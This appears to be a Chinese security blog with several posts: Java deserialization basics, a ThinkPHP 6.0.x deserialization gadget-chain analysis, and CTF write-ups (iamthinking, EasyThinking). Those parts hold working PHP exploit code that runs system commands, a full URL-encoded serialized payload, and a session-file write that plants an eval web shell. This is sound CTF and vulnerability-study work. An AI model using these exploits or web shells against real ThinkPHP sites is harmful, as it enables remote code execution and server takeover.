<p>Java虚拟机判断是否允许序列化数据被序列化时，会取决于两个类的serialVersionUID是否一致。serialVerionUID在不同编译器内可能有不同的值，开发者可以在目标序列化类中提供固定值。在提高serialVerionUID固定值的情况下，只要序列化数据中国的serialVerionUID和目标序列化类中的一致就可以成功反序列化。如果没有指定值，编译器会根据class文件内容通过一定算法生成值，在不同环境下，编译器得到的serialVerionUID值不同，就会导致反序列化失败。改变目标类中代码也可能会影响生成的serialVersionUID，此时会抛出java.io.InvalidClassException并指出serialVersionUID不一致。建议在目标序列化类中显示定义serialVersionUID并赋予明确的值。</p>
<p>显示定义serialVersionUID有两种用途：</p>
<p>1.在某些场合，希望类的不同版本兼容序列化，所以需要确保类的不同版本有相同的serialVersionUID</p>
<p>2.某些时候不希望类的不同版本对序列化有兼容，所以需要类的不同版本有不同的serialVerionUID</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>java有多种序列化和反序列化工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JDK自带的Serializable</span><br><span class="line">fastjson和jackson是JSON的知名反序列化工具</span><br><span class="line">xmldecoder和xstream是XML的知名反序列化工具</span><br></pre></td></tr></table></figure>

<p>java拥有完善的第三方类库和满足各种需求的框架，但因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，那么受影响范围将极为广泛。</p>
<h2 id="漏洞入口"><a href="#漏洞入口" class="headerlink" title="漏洞入口"></a>漏洞入口</h2><p>ObjectInputStream对象的readObject函数调用是java反序列化流程的入口，序列化数据的来源包括：Cookie、GET参数、POST参数或者流、HTTP Head或者来自用户可控内容的数据库等。</p>
<p>触发场景：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP请求中的参数</span><br><span class="line">2.RMI，即Java远程方法调用，在RMI中传输的数据皆为序列化</span><br><span class="line">3.JMX，一个为应用程序植入管理功能的框架</span><br><span class="line">4.自定义协议 用来接收与发送原始的java对象</span><br></pre></td></tr></table></figure>

<p>反序列化相关函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>



<h2 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h2><p>序列化的数据头是不变的，传输过程中可能会对字节流进行编码，解码后查看字节流开头，反序列化数据开头包含两字节的魔术数字，后面是两字节的版本号，如<code>ac ed 00 05</code>，而经过Base64编码过序列化数据的字节流头部为<code>Ro0AB</code>，在攻击检测时可针对该特征进行匹配请求post中是否包含反序列化数据，判断是否为反序列化漏洞攻击。</p>
<h2 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h2><p>JDK原生反序列化工具Serializable大致有两种利用形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.完整对象前的利用</span><br><span class="line">在JDK对恶意序列化数据进行反序列化的过程中达成攻击效果，这种利用方式大多基于对java开发中频繁调用函数的理解，寻找漏洞触发点。例如commons-collections3.1反序列化漏洞利用中的rce gadget属于以readObject函数调用点为入口，直接在依赖包中寻找到rce的利用方式</span><br><span class="line"></span><br><span class="line">2.生成完整对象的利用</span><br><span class="line">如身份令牌反序列化，要等待对象反序列化完成后，利用其中的函数或者属性值完成攻击</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-11T07:48:31.000Z" title="2021-04-11T07:48:31.000Z">2021-04-11</time>发表</span><span class="level-item"><time dateTime="2021-04-11T07:57:49.381Z" title="2021-04-11T07:57:49.381Z">2021-04-11</time>更新</span><span class="level-item">9 分钟读完 (大约1318个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/11/Thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Thinkphp6.0.x反序列化</a></h1><div class="content"><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">think\Model --&gt; __destruct()</span><br><span class="line">think\Model --&gt; save()</span><br><span class="line">think\Model --&gt; updateData()</span><br><span class="line">think\Model --&gt; checkAllowFields()</span><br><span class="line">think\Model --&gt; db()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后半部分利用链（同tp 5.2后半部分利用链)</span><br><span class="line"></span><br><span class="line">think\model\concern\Conversion --&gt; __toString()</span><br><span class="line">think\model\concern\Conversion --&gt; __toJson()</span><br><span class="line">think\model\concern\Conversion --&gt; __toArray()</span><br><span class="line">think\model\concern\Attribute --&gt; getAttr()</span><br><span class="line">think\model\concern\Attribute --&gt; getValue()</span><br></pre></td></tr></table></figure>



<p>vendor/topthink/think-orm/src/Model.php</p>
<p>Model类中存在<code>__destruct()</code>方法，令<code>$this-&gt;lazySave</code>等于true，调用<code>save()</code>。Model类为抽象类，利用的时候要用它的子类Pivot</p>
<p><img src="https://ae01.alicdn.com/kf/Udb251c41e330455b8fb5097af7b8f1f4l.jpg"></p>
<p>跟进<code>save()</code>函数，触发点位于updateData函数内，首先需要构造参数防止函数直接返回，才能进入updateData()函数</p>
<p><img src="https://ae01.alicdn.com/kf/U7b22f6dd27c7476cb941ac9835abf8c2c.jpg"></p>
<p>需要满足三个条件才能进入<code>updateData()</code>，</p>
<p>1.<code>$this-&gt;exists</code>为true</p>
<p>2.<code>isEmpty()</code>需要返回false，给<code>$this-&gt;data</code>赋值即可</p>
<p><img src="https://ae01.alicdn.com/kf/Ufc13f37c25054146a92fd6bc978387cfY.jpg"></p>
<p>3.<code>trigger()</code>需要返回true，让<code>$this-&gt;withEvent</code>等于false</p>
<p><img src="https://ae01.alicdn.com/kf/U519975bafe3b4ba39b3d4485b2e2558by.jpg"></p>
<p><code>checkAllowFields()</code>触发<code>__toString()</code>，需要构造参数防止提前return，第一个if条件已经满足。第二个if，需要<code>empty($data)</code>等于false<img src="https://ae01.alicdn.com/kf/U6cfffa14ceb744c9aa721e51c943b08fV.jpg"></p>
<p>/vendor/topthink/think-orm/src/model/concern/Attribute.php</p>
<p>跟进getChangeData()方法，让<code>$this-&gt;force</code>和<code>$this-&gt;data</code>都有值就可以</p>
<p><img src="https://ae01.alicdn.com/kf/U8068fa04022e47df9b42d86110a778a8F.jpg"></p>
<p>需要先满足<code>$this-&gt;field</code>为空、<code>$this-&gt;schema</code>为空两个条件才能调用<code>$this-&gt;db()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U2d23332ec7634727b78b56ec0be104b0q.jpg"></p>
<p><code>db()</code>方法中出现了拼接字符串操作，触发<code>__toString()</code>，需要先让<code>$this-&gt;connection</code>等于mysql</p>
<p><img src="https://ae01.alicdn.com/kf/U703843abe7084b8291c72699885cb84eC.jpg"></p>
<p>接下来就是原来tp5的<code>__toString</code>利用链，由于model\concern\Conversion是一个trait复用类，所以只要在Model下use即可</p>
<p>vendor/topthink/think-orm/src/model/concern/Conversion.php</p>
<p>存在<code>__toString()</code>方法，调用<code>toJson()</code></p>
<p><img src="https://ae01.alicdn.com/kf/Ude5942d7801b4bb2a2511f1eca911eb1N.jpg"></p>
<p>跟进<code>toJson()</code>，调用<code>__toArray()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U01245cd69e9d40ae8b3d8675f4f51d81N.jpg"></p>
<p><code>toArray()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U35601ce018cf4d2bafde20e70dff77a7o.jpg"><img src="https://ae01.alicdn.com/kf/U9c2f1cb03dc24b74bfe0ad667bb02a02H.jpg"></p>
<p>vendor/topthink/think-orm/src/model/concern/Attribute.php</p>
<p><code>getAttr()</code>函数，调用getValue()</p>
<p><img src="https://ae01.alicdn.com/kf/U2fe78f342e7542df97e2b458ea4b8b32s.jpg"></p>
<p><code>getData()</code></p>
<p><img src="https://ae01.alicdn.com/kf/Uc4fadcd1d5fe4c539aa5c52b035fb353I.jpg"></p>
<p><code>getRealFieldName()</code>，<code>$this-&gt;strict</code>等于true返回<code>$name</code>，这样<code>getData()</code>方法就会返回<code>$this-&gt;data[$name]</code>。</p>
<p><img src="https://ae01.alicdn.com/kf/U75a107b89387416ea707f9c7aa7f978dJ.jpg"></p>
<p><code>getValue()</code>函数中存在命令执行，当<code>$this-&gt;withAttr[$fieldName]</code>不为数组的时候触发。</p>
<p><img src="https://ae01.alicdn.com/kf/U2ccdaddc20c3418b9ad6e7aabf3667fc1.jpg"></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;whoami&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$field</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$schema</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="built_in">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>本地测试</p>
<p><img src="https://ae01.alicdn.com/kf/U6147714709d54a8287f0eab71c70632cc.jpg"></p>
<h1 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h1><p>存在备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://ae01.alicdn.com/kf/U9820749315214de0b56df1fdfcfd1972t.jpg"></p>
<p>查看源码得到版本为thinkphp6，查看控制器，发现存在unserialize。过滤了O开头的字符串，可以根据parse_url的特性绕过，在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false。</p>
<p><img src="https://ae01.alicdn.com/kf/Ubde65ecd0f4c479f965c9d61ce9abe8fC.jpg"></p>
<p>在解析形如<code>http://xxx.com///index.php?payload=cmd</code>这样的URI时parse_url会返回false</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;cat /flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$field</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$schema</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//定义this-&gt;data不为空</span></span><br><span class="line">            <span class="built_in">parent</span>::__construct();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Pivot();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> Pivot(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用反序列化漏洞，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c9c7cb46-f78b-4359-a3b6-7cfc292d6693.node3.buuoj.cn&#x2F;&#x2F;&#x2F;public&#x2F;?payload&#x3D;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://ae01.alicdn.com/kf/Ua4b2ba8f1083450a97da5f44101cc09d5.jpg"></p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12203047.html">https://www.cnblogs.com/20175211lyz/p/12203047.html</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1160">https://forum.90sec.com/t/topic/1160</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-10T06:17:32.000Z" title="2021-04-10T06:17:32.000Z">2021-04-10</time>发表</span><span class="level-item"><time dateTime="2021-04-10T06:49:57.100Z" title="2021-04-10T06:49:57.100Z">2021-04-10</time>更新</span><span class="level-item">6 分钟读完 (大约889个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/10/Thinkphp6-0-0-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Thinkphp6.0.0-6.0.1 任意文件操作漏洞复现</a></h1><div class="content"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>thinkphp6默认是没有开启session功能的,需要取消app\middleware.php文件中对session的注释</p>
<p><img src="https://i.loli.net/2021/04/10/OPnASFNwt2DaoKf.png" alt="image-20210410120046743.png"></p>
<p>由于默认情况下没有创建session，所需要修改一下控制器，加上创建session的功能。</p>
<p><img src="https://www.hualigs.cn/image/607146a875416.jpg"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>修改cookie为<code>PHPSESSID=aaaabbbbccccddddeeeeffff1234.php</code>，文件名长度必须等于32位</p>
<p><img src="https://i.loli.net/2021/04/10/rAE1VqHf87vWnNK.png" alt="image-20210410121629403.png"></p>
<p>写入成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp6.0.0&#x2F;runtime&#x2F;session&#x2F;sess_aaaabbbbccccddddeeeeffff1234.php</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607146af4dd4b.jpg"></p>
<p>写入文件内容</p>
<p><img src="https://www.hualigs.cn/image/607146a5efef4.jpg"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>vendor/topthink/framework/src/think/session/Store.php</p>
<p>调用了<code>write()</code>方法，<code>$sessionId</code>等于<code>$this-&gt;id</code></p>
<p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146a87f1fe.jpg"></p>
<p>vendor/topthink/framework/src/think/session/driver/File.php</p>
<p>跟进<code>write()</code>方法，写入文件名为经过<code>getFileName()</code>处理的<code>$sessID</code>，写入文件内容为传入的参数<code>$sessData</code></p>
<p><img src="https://www.hualigs.cn/image/607146a28d9ef.jpg"></p>
<p>跟进<code>getFileName()</code>，文件名实质上就等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p>
<p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p>
<p><code>writeFile()</code>方法调用了file_put_contents()写入文件，写入的文件名等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p>
<p><img src="https://www.hualigs.cn/image/607146a31e76e.jpg"></p>
<p>接着查找<code>$this-&gt;id</code>的来源，当传入的参数$id长度等于32位时返回<code>$this-&gt;id</code>等于<code>$id</code>。</p>
<p><img src="https://www.hualigs.cn/image/607146a41f03a.jpg"></p>
<p>vendor/topthink/framework/src/think/middleware/SessionInit.php</p>
<p>这里调用了<code>setId()</code>方法，$cookName等于PHPSESID， <code>$this-&gt;$id</code> 最终来源于cookie中的 <code>PHPSESSID</code> 。这样写入的文件名就可控了。文件内容<code>data</code>来源于session的内容，需要代码中存在可以控制session内容的操作，如<code>Session::set(&#39;name&#39;,$_POST[&#39;c&#39;]);</code>，就可以写入shell。</p>
<p><img src="https://www.hualigs.cn/image/607146aba283e.jpg"></p>
<p>vendor/topthink/framework/src/think/session/Store.php</p>
<p><img src="https://www.hualigs.cn/image/607146a4916e6.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146a4ef622.jpg"></p>
<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>vendor/topthink/framework/src/think/session/Store.php</p>
<p>要触发<code>delete()</code>方法必须要使<code>$this-&gt;data</code>为空，即session中的变量键值为空</p>
<p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p>
<p>vendor/topthink/framework/src/think/session/driver/File.php</p>
<p>delete()方法中的文件名拼接上了sess_，文件名不完全可控，在windows下才可以用一个不存在的目录绕过限制删除任意文件。</p>
<p><img src="https://www.hualigs.cn/image/607146a9d0e64.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p>
<h1 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h1><p>通过错误信息得到thinkphp版本为6.0.0</p>
<p><img src="https://www.hualigs.cn/image/607146a9c41b3.jpg"></p>
<p>存在<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="https://www.hualigs.cn/image/607146a90a25a.jpg"></p>
<p>\app\middleware.php</p>
<p>session开启</p>
<p><img src="https://www.hualigs.cn/image/60714743b1aaa.jpg"></p>
<p>\app\home\controller\Member.php</p>
<p>在search控制器下出现了创建session操作，session键值key通过post传参，内容可控</p>
<p><img src="https://www.hualigs.cn/image/607146af6b105.jpg"></p>
<p>注册一个用户</p>
<p><img src="https://www.hualigs.cn/image/607146ae5a420.jpg"></p>
<p>登陆，修改修改PHPSESSID为aaaabbbbccccddddeeeeffff1234.php</p>
<p><img src="https://www.hualigs.cn/image/607146ad52377.jpg"></p>
<p>写入shell，key=<code>&lt;?php eval($_POST[1]);?&gt;</code></p>
<p><img src="https://www.hualigs.cn/image/607146a99aef8.jpg"></p>
